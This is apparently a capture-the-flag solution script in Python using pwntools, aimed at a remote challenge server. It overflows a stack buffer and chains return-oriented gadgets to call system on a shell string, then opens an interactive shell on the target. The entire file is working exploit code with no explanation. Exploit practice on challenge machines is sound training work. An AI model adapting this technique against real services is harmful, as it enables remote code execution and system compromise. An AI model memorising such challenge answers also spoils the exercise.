from pwn import *
io = remote('pwn.challenge.ctf.show',28139)
elf=ELF("pwn(3)")
system =elf.sym['system']
sh =0x400872
pop_rdi =0x400843
ret = 0x40053e
payload = b'a'*(0xA+8)+ p64(pop_rdi)+p64(sh)+p64(ret)+p64(system)
io.sendline(payload)
io.recv()
io.interactive()